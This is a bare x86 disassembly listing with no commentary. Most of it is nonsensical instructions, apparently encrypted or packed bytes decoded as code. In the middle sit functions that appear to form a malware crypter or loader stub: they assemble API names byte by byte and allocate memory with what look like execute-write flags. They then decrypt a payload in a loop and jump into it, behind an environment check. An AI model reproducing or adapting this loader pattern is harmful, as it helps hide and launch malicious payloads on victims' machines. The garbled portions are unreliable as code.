  4213f6:	add    eax,0x40672f60
  4213fb:	add    eax,0x93f8d388
  421400:	dec    ebx
  421401:	pop    ebx
  421402:	lahf   
  421403:	lea    eax,[ebp+0x23]
  421406:	fadd   QWORD PTR [ebp+ecx*1+0x2c]
  42140a:	ja     0x42147e
  42140c:	cmp    BYTE PTR [ecx],0xd1
  42140f:	cmp    eax,edx
  421411:	mov    edx,0x5806f195
  421416:	sbb    eax,0xeda9fcd
  42141b:	xor    cl,ch
  42141d:	fdiv   st,st(2)
  42141f:	cli    
  421420:	test   DWORD PTR [edi-0x50cc9ee7],0xa3cbbb0e
  42142a:	xor    edi,DWORD PTR [eax]
  42142c:	repz int 0xd3
  42142f:	sbb    DWORD PTR [edi-0x64bd2467],0xf8eb6a06
  421439:	jne    0x4213fd
  42143b:	push   edx
  42143c:	pop    esi
  42143d:	mov    dh,0x1
  42143f:	and    dh,BYTE PTR [ecx+0x24519fbf]
  421445:	add    esp,DWORD PTR [ecx+0x13]
  421448:	loopne 0x42140b
  42144a:	addr16 xor esi,eax
  42144d:	cmpps  xmm6,XMMWORD PTR [ebx-0x2e],0x4e
  421452:	rol    BYTE PTR [edx+edx*1],1
  421455:	push   0xffffffe0
  421457:	jle    0x421435
  421459:	repnz cmp eax,0xa716a0a8
  42145f:	or     ebx,edx
  421461:	sub    esp,edi
  421463:	inc    eax
  421464:	add    eax,DWORD PTR [ecx-0x80]
  421467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421468:	mov    bl,0xb8
  42146a:	push   esp
  42146b:	popf   
  42146c:	xor    al,0xe2
  42146e:	adc    eax,0x949ca38f
  421473:	mov    bh,0x2c
  421475:	fistp  WORD PTR [ebx+0x15]
  421478:	sub    BYTE PTR [ecx-0x29],ch
  42147b:	cmp    DWORD PTR [esi+0x65c3e20c],ecx
  421481:	ffreep st(0)
  421483:	loopne 0x421418
  421485:	dec    ebx
  421486:	test   BYTE PTR [edx+0x4b63dc9e],dl
  42148c:	mov    cl,0x59
  42148e:	or     al,0xa5
  421490:	jmp    0xe361:0x69f8e4d6
  421497:	pop    esi
  421498:	push   esp
  421499:	mov    edx,0x6d9872f0
  42149e:	add    al,0x44
  4214a0:	push   edi
  4214a1:	and    BYTE PTR [ebx+edi*2+0x6e8657c0],ch
  4214a8:	mov    al,0x56
  4214aa:	mov    al,ds:0x4402185e
  4214af:	pop    edi
  4214b0:	push   ds
  4214b1:	push   cs
  4214b2:	mov    cl,0xeb
  4214b4:	adc    eax,0x17d2d1f0
  4214b9:	addr16 adc edx,esp
  4214bc:	or     esp,DWORD PTR [esi+0x4a5481c7]
  4214c2:	in     al,0xdc
  4214c4:	pop    eax
  4214c5:	fs jno 0x421490
  4214c8:	popa   
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xe1b0b27b
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x81a3a346
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    FWORD PTR [ebx]
  42182f:	lock in eax,dx
  421831:	add    al,0x2a
  421833:	adc    eax,0xf0cbe400
  421838:	jb     0x4217bc
  42183a:	or     BYTE PTR [ecx+0x29bc7daa],bl
  421840:	adc    eax,0xf0cfe400
  421845:	jb     0x421809
  421847:	mul    DWORD PTR [esi-0x56]
  42184a:	jge    0x421850
  42184c:	sub    DWORD PTR ds:0xf0cfe400,edx
  421852:	jb     0x4217d6
  421854:	mul    DWORD PTR [esi-0x56]
  421857:	jge    0x42185d
  421859:	sub    DWORD PTR ds:0xf0cfe400,edx
  42185f:	jb     0x4217e3
  421861:	mul    DWORD PTR [esi-0x56]
  421864:	jge    0x42186a
  421866:	sub    DWORD PTR ds:0xf037e400,edx
  42186c:	jb     0x4217f0
  42186e:	stc    
  42186f:	jns    0x421881
  421871:	jae    0x421877
  421873:	popf   
  421874:	sbb    al,0xcd
  421876:	lds    esi,FWORD PTR [edi-0xf]
  421879:	ds dec edi
  42187b:	(bad)  
  42187c:	xor    al,dl
  42187e:	adc    al,0x77
  421880:	or     DWORD PTR [ebp+0x72],esp
  421883:	mov    ebp,DWORD PTR [eax-0x2810ec7e]
  421889:	add    eax,0x466a13cb
  42188e:	popa   
  42188f:	and    BYTE PTR [esi-0x8ff2f56],al
  421895:	cdq    
  421896:	inc    esi
  421897:	ret    
  421898:	adc    esp,DWORD PTR [ebp*2-0x5d3baca6]
  42189f:	lahf   
  4218a0:	push   ss
  4218a1:	out    0xd9,eax
  4218a3:	imul   esp,DWORD PTR [edi+0x15292077],0x0
  4218aa:	in     al,0xcf
  4218ac:	lock jb 0x421834
  4218af:	outs   dx,BYTE PTR ds:[esi]
  4218b0:	call   0x431f:0xbbfc3ef3
  4218b7:	sbb    al,0x5d
  4218b9:	cli    
  4218ba:	xor    DWORD PTR [edx+0x65],edi
  4218bd:	ins    BYTE PTR es:[edi],dx
  4218be:	repnz sbb BYTE PTR [eax],cl
  4218c1:	and    ecx,DWORD PTR [edx-0x8]
  4218c4:	jbe    0x42188b
  4218c6:	test   al,0x17
  4218c8:	mov    edx,0xef52a4fd
  4218cd:	push   cs
  4218ce:	jno    0x421940
  4218d0:	cmp    esi,ebp
  4218d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218d3:	or     al,ah
  4218d5:	mov    bl,bl
  4218d7:	call   0xd184906f
  4218dc:	xchg   DWORD PTR [edx],ecx
  4218de:	scas   al,BYTE PTR es:[edi]
  4218df:	dec    edi
  4218e0:	loope  0x42195a
  4218e2:	enter  0xf40f,0xa0
  4218e6:	aaa    
  4218e7:	test   BYTE PTR [eax],ch
  4218e9:	pop    ds
  4218ea:	pop    eax
  4218eb:	sbb    al,0x5d
  4218ed:	cli    
  4218ee:	xor    DWORD PTR [edx+0x64],edi
  4218f1:	ins    BYTE PTR es:[edi],dx
  4218f2:	add    BYTE PTR [esi+edx*4+0x64d8aa23],0xc5
  4218fa:	mov    ebp,0x3efd108a
  4218ff:	iret   
  421900:	inc    eax
  421901:	push   cs
  421902:	and    ebp,ebp
  421904:	xchg   edx,eax
  421905:	out    dx,al
  421906:	xchg   edi,eax
  421907:	xchg   ebp,eax
  421908:	jp     0x421892
  42190a:	mov    ch,0x9e
  42190c:	cmp    BYTE PTR [edi+0x5c],dh
  42190f:	dec    esp
  421910:	sbb    cl,BYTE PTR [edx]
  421912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421913:	aaa    
  421914:	bound  edi,QWORD PTR [eax-0x30]
  421917:	sahf   
  421918:	add    eax,0xbbfc3ec2
  42191d:	pop    ds
  42191e:	add    ah,ah
  421920:	iret   
  421921:	lock jb 0x4218a6
  421924:	mul    DWORD PTR [esi-0x6]
  421927:	cmp    BYTE PTR [ecx+ebp*1],al
  42192a:	pop    ecx
  42192b:	add    esi,esp
  42192d:	iret   
  42192e:	push   eax
  42192f:	mov    ds:0xaa66b8e9,al
  421934:	jge    0x42193a
  421936:	sub    DWORD PTR ds:0xf02fe400,edx
  42193c:	jno    0x4218c1
  42193e:	cld    
  42193f:	addr16 mov al,ds:0x47d
  421943:	(bad)  
  421944:	adc    DWORD PTR [eax],eax
  421946:	in     al,0x73
  421948:	div    BYTE PTR [edx-0x7e]
  42194b:	mul    DWORD PTR [esi-0x56]
  42194e:	ins    BYTE PTR es:[edi],dx
  42194f:	mov    ecx,0xf4001529
  421954:	iret   
  421955:	lock jb 0x4218da
  421958:	repnz data16 stos BYTE PTR es:[edi],al
  42195b:	jge    0x4219a2
  42195d:	sub    DWORD PTR ds:0xf0cfe410,edx
  421963:	jo     0x4218e7
  421965:	mul    DWORD PTR [ebx-0x56]
  421968:	jl     0x42196e
  42196a:	sub    DWORD PTR ds:0xf0cae400,edx
  421970:	jae    0x4218f4
  421972:	mul    DWORD PTR [esi-0x56]
  421975:	jge    0x42197b
  421977:	jns    0x421992
  421979:	add    ah,ah
  42197b:	retf   
  42197c:	lock jb 0x421902
  42197f:	adc    esp,DWORD PTR [ebx-0x56]
  421982:	jg     0x421988
  421984:	sub    DWORD PTR [ebp-0xf201c00],edx
  42198a:	jb     0x42191e
  42198c:	mul    DWORD PTR [esi-0x56]
  42198f:	jge    0x4219a5
  421991:	sub    DWORD PTR ds:0xf0cfe410,edx
  421997:	jb     0x42191b
  421999:	div    DWORD PTR [esi-0x56]
  42199c:	jge    0x4219a2
  42199e:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219a4:	jb     0x421928
  4219a6:	add    ebx,DWORD PTR [edi-0x5a]
  4219a9:	jge    0x421a18
  4219ab:	sub    dl,BYTE PTR ds:0xfb3fe400
  4219b1:	jb     0x421980
  4219b3:	mov    esi,0x47daa66
  4219b8:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219be:	jb     0x421942
  4219c0:	mul    DWORD PTR [esi-0x56]
  4219c3:	jge    0x4219c9
  4219c5:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219cb:	jb     0x42194f
  4219cd:	mul    DWORD PTR [esi-0x56]
  4219d0:	jge    0x4219d6
  4219d2:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219d8:	jb     0x42195c
  4219da:	mul    DWORD PTR [esi-0x56]
  4219dd:	jge    0x4219e3
  4219df:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219e5:	jb     0x421969
  4219e7:	mul    DWORD PTR [esi-0x56]
  4219ea:	jge    0x4219f0
  4219ec:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219f2:	jb     0x421976
  4219f4:	mul    DWORD PTR [esi-0x56]
  4219f7:	jge    0x4219fd
  4219f9:	sub    DWORD PTR ds:0xf0cfe400,edx
  4219ff:	jb     0x421983
  421a01:	mul    DWORD PTR [esi-0x56]
  421a04:	jge    0x421a0a
  421a06:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a0c:	jb     0x421990
  421a0e:	mul    DWORD PTR [esi-0x56]
  421a11:	jge    0x421a17
  421a13:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a19:	jb     0x42199d
  421a1b:	mul    DWORD PTR [esi-0x56]
  421a1e:	push   ebx
  421a1f:	jo     0x421a6d
  421a21:	ins    DWORD PTR es:[edi],dx
  421a22:	je     0x421a08
  421a24:	iret   
  421a25:	lock jb 0x421a8a
  421a28:	cld    
  421a29:	data16 stos BYTE PTR es:[edi],al
  421a2b:	ins    DWORD PTR es:[edi],dx
  421a2c:	add    al,0x29
  421a2e:	adc    eax,0xf0cfe0d4
  421a33:	jbe    0x4219b7
  421a35:	div    DWORD PTR [esi]
  421a37:	out    dx,eax
  421a38:	ds ss jge 0x421a96
  421a3c:	add    ah,ah
  421a3e:	iret   
  421a3f:	lock jb 0x4219c4
  421a42:	xlat   BYTE PTR ds:[ebx]
  421a43:	data16 stos BYTE PTR es:[edi],al
  421a45:	popf   
  421a46:	sub    bl,BYTE PTR [ebx+0x66]
  421a49:	jb     0x4219d2
  421a4b:	iret   
  421a4c:	lock jb 0x4219d1
  421a4f:	xchg   edi,eax
  421a50:	data16 stos BYTE PTR es:[edi],al
  421a52:	jge    0x421a48
  421a54:	and    dl,BYTE PTR ds:0xf0cfbe00
  421a5a:	jb     0x421ab6
  421a5c:	rep data16 stos BYTE PTR es:[edi],al
  421a5f:	jge    0x421a65
  421a61:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a67:	jb     0x4219eb
  421a69:	test   DWORD PTR [esi-0x56],0x1529e47d
  421a70:	add    ah,ah
  421a72:	iret   
  421a73:	lock jb 0x4219f8
  421a76:	mul    DWORD PTR [esi-0x56]
  421a79:	jge    0x421a7f
  421a7b:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a81:	jb     0x421a05
  421a83:	mul    DWORD PTR [esi-0x56]
  421a86:	jge    0x421a8c
  421a88:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a8e:	jb     0x421a12
  421a90:	mul    DWORD PTR [esi-0x56]
  421a93:	jge    0x421a99
  421a95:	sub    DWORD PTR ds:0xf0cfe400,edx
  421a9b:	jb     0x421a1f
  421a9d:	mul    DWORD PTR [esi-0x56]
  421aa0:	jge    0x421aa6
  421aa2:	sub    DWORD PTR ds:0xf0cfe400,edx
  421aa8:	jb     0x421a2c
  421aaa:	mul    DWORD PTR [esi-0x56]
  421aad:	jge    0x421ab3
  421aaf:	sub    DWORD PTR ds:0xf0cfe400,edx
  421ab5:	jb     0x421a39
  421ab7:	mul    DWORD PTR [esi-0x56]
  421aba:	jge    0x421ac0
  421abc:	sub    DWORD PTR ds:0xf0cfe400,edx
  421ac2:	jb     0x421a46
  421ac4:	mul    DWORD PTR [esi-0x56]
  421ac7:	jge    0x421acd
  421ac9:	sub    DWORD PTR ds:0xf0cfe400,edx
  421acf:	jb     0x421a53
  421ad1:	mul    DWORD PTR [esi-0x56]
  421ad4:	jge    0x421ada
  421ad6:	sub    DWORD PTR ds:0xf0cfe400,edx
  421adc:	jb     0x421a60
  421ade:	mul    DWORD PTR [esi-0x56]
  421ae1:	jge    0x421ae7
  421ae3:	sub    DWORD PTR ds:0xf0cfe400,edx
  421ae9:	jb     0x421a6d
  421aeb:	mul    DWORD PTR [esi-0x56]
  421aee:	jge    0x421af4
  421af0:	sub    DWORD PTR ds:0xf0cfe400,edx
  421af6:	jb     0x421a7a
  421af8:	mul    DWORD PTR [esi-0x56]
  421afb:	jge    0x421b01
  421afd:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b03:	jb     0x421a87
  421b05:	mul    DWORD PTR [esi-0x56]
  421b08:	jge    0x421b0e
  421b0a:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b10:	jb     0x421a94
  421b12:	mul    DWORD PTR [esi-0x56]
  421b15:	jge    0x421b1b
  421b17:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b1d:	jb     0x421aa1
  421b1f:	mul    DWORD PTR [esi-0x56]
  421b22:	jge    0x421b28
  421b24:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b2a:	jb     0x421aae
  421b2c:	mul    DWORD PTR [esi-0x56]
  421b2f:	jge    0x421b35
  421b31:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b37:	jb     0x421abb
  421b39:	mul    DWORD PTR [esi-0x56]
  421b3c:	jge    0x421b42
  421b3e:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b44:	jb     0x421ac8
  421b46:	mul    DWORD PTR [esi-0x56]
  421b49:	jge    0x421b4f
  421b4b:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b51:	jb     0x421ad5
  421b53:	mul    DWORD PTR [esi-0x56]
  421b56:	jge    0x421b5c
  421b58:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b5e:	jb     0x421ae2
  421b60:	mul    DWORD PTR [esi-0x56]
  421b63:	jge    0x421b69
  421b65:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b6b:	jb     0x421aef
  421b6d:	mul    DWORD PTR [esi-0x56]
  421b70:	jge    0x421b76
  421b72:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b78:	jb     0x421afc
  421b7a:	mul    DWORD PTR [esi-0x56]
  421b7d:	jge    0x421b83
  421b7f:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b85:	jb     0x421b09
  421b87:	mul    DWORD PTR [esi-0x56]
  421b8a:	jge    0x421b90
  421b8c:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b92:	jb     0x421b16
  421b94:	mul    DWORD PTR [esi-0x56]
  421b97:	jge    0x421b9d
  421b99:	sub    DWORD PTR ds:0xf0cfe400,edx
  421b9f:	jb     0x421b23
  421ba1:	mul    DWORD PTR [esi-0x56]
  421ba4:	jge    0x421baa
  421ba6:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bac:	jb     0x421b30
  421bae:	mul    DWORD PTR [esi-0x56]
  421bb1:	jge    0x421bb7
  421bb3:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bb9:	jb     0x421b3d
  421bbb:	mul    DWORD PTR [esi-0x56]
  421bbe:	jge    0x421bc4
  421bc0:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bc6:	jb     0x421b4a
  421bc8:	mul    DWORD PTR [esi-0x56]
  421bcb:	jge    0x421bd1
  421bcd:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bd3:	jb     0x421b57
  421bd5:	mul    DWORD PTR [esi-0x56]
  421bd8:	jge    0x421bde
  421bda:	sub    DWORD PTR ds:0xf0cfe400,edx
  421be0:	jb     0x421b64
  421be2:	mul    DWORD PTR [esi-0x56]
  421be5:	jge    0x421beb
  421be7:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bed:	jb     0x421b71
  421bef:	mul    DWORD PTR [esi-0x56]
  421bf2:	jge    0x421bf8
  421bf4:	sub    DWORD PTR ds:0xf0cfe400,edx
  421bfa:	jb     0x421b7e
  421bfc:	mul    DWORD PTR [esi-0x56]
  421bff:	jge    0x421c05
  421c01:	sub    DWORD PTR ds:0xf0cfe400,edx
  421c07:	jb     0x421b8b
  421c09:	mul    DWORD PTR [esi-0x56]
  421c0c:	jge    0x421c12
  421c0e:	sub    DWORD PTR ds:0xf0cfe400,edx
  421c14:	jb     0x421b98
  421c16:	mul    DWORD PTR [esi-0x56]
  421c19:	jge    0x421c1f
  421c1b:	sub    DWORD PTR ds:0xf0cfe400,edx
  421c21:	jb     0x421ba5
  421c23:	mul    DWORD PTR [esi-0x56]
  421c26:	jge    0x421c2c
  421c28:	sub    DWORD PTR ds:0xf0cfe400,edx
  421c2e:	sbb    eax,0x8566fc2a
  421c33:	jge    0x421c39
  421c35:	cmp    DWORD PTR ds:0x2a6dce00,edx
  421c3b:	add    esp,esp
  421c3d:	or     BYTE PTR [ebx+0x34],cl
  421c40:	cli    
  421c41:	push   esp
  421c42:	les    esp,FWORD PTR [ebx]
  421c44:	call   0x14a79840
  421c49:	repz jae 0x421c88
  421c4c:	mov    ecx,0x783fb3cc
  421c51:	in     al,0x6e
  421c53:	dec    esi
  421c54:	ss pop esp
  421c56:	loopne 0x421cbf
  421c58:	pop    ecx
  421c59:	xchg   ebx,eax
  421c5a:	dec    esi
  421c5b:	dec    ebx
  421c5c:	cwde   
  421c5d:	add    ah,BYTE PTR [edx]
  421c5f:	in     al,0xe8
  421c61:	push   edi
  421c62:	cli    
  421c63:	xlat   BYTE PTR ds:[ebx]
  421c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c65:	or     eax,DWORD PTR [ebx]
  421c67:	dec    edi
  421c68:	cmp    esp,esi
  421c6a:	add    DWORD PTR [ecx+0x562ec084],esi
  421c70:	cmp    DWORD PTR [ebx-0x3ad904b],edi
  421c76:	mov    bh,0x1f
  421c78:	out    dx,eax
  421c79:	sub    bh,0x53
  421c7c:	jge    0x421cf1
  421c7e:	pop    ebp
  421c7f:	dec    ebx
  421c80:	out    dx,eax
  421c81:	add    eax,0xce567842
  421c86:	push   ebp
  421c87:	mov    ecx,ebx
  421c89:	nop    DWORD PTR [esi+0x3c]
  421c8d:	dec    eax
  421c8e:	jp     0x421c40
